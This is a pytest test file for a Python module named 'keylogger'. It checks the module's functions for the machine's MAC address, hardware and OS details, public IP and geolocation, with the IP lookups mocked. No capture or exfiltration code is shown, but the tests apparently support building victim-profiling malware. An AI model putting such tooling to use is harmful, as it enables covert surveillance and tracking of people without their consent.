import pytest
import re
from keylogger import get_mac, SystemInfo, IPAddress

# Test case for get_mac function
def test_get_mac():
    mac = get_mac()
    # MAC Address is not None
    assert mac is not None, "MAC address should not be None"   

    # MAC Address format 
    mac_regex = r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})"
    assert re.match(mac_regex, mac), f"Invalid MAC address format: {mac}"

# Test case for class SystemInfo
def test_system_info():
    system_info = SystemInfo()

    # Test CPU in4
    assert system_info.cpu_info != 'Unable to retrieve CPU info', 'Failed to get CPU info'  

    # Test RAM in4, make sure return -> string & contains GB 
    assert isinstance(system_info.ram_info, str) and 'GB' in system_info.ram_info
    assert system_info.ram_info != 'Unable to retrive RAM info', 'Failed to get RAM info'

    # Check disk info list not empty 
    assert len(system_info.disk_info) > 0, 'Disk info should not be empty'
    assert system_info.disk_info != 'Unable to retrive Disk info', 'Failed to get Disk info'

    # Check GPU info list not empty
    assert len(system_info.gpu_info) > 0, 'GPU info should not be empty'
    assert system_info.gpu_info != 'Unable to retrive GPU info', 'Failed to get GPU info'

    # Check OS in4, make sure -> string
    assert isinstance(system_info.os_info, str)
    assert system_info.os_info != 'Unable to retrive OS info', 'Failed to get OS info'

# Test case for IPAddress class
def test_ip_address(monkeypatch):
    # Mock requests -> local & public IP for test without calling API
    def mock_get(*args, **kwargs):
        class MockResponse:
            def json(self):
                if args[0] == 'https://api.ipify.org?format=json':
                    return {'ip': '192.168.1.1'}        # -> Mocked address IP 
                elif 'http://ip-api.com/json/' in args[0]:
                    return {
                        'status': 'success',
                        'city': 'Paris',
                        'regionName': 'Île-de-France',
                        'country': 'France'
                    }
    
            def raise_for_status(self):
                pass

        return MockResponse() 
    
    monkeypatch.setattr('requests.get', mock_get)

    # Check public IP
    public_ip = IPAddress.get_public_ip()
    assert public_ip == '192.168.1.1', 'Public IP should be mocked to 192.168.1.1'

    # Check local IP 
    local_ip = IPAddress.get_local_ip()
    assert isinstance(local_ip, str) and len(local_ip) > 0, 'Unable to retrive Local IP'

    # Check location 
    location = IPAddress.get_location(public_ip)
    assert location == 'Paris, Île-de-France, France', 'Location should match mocked location'
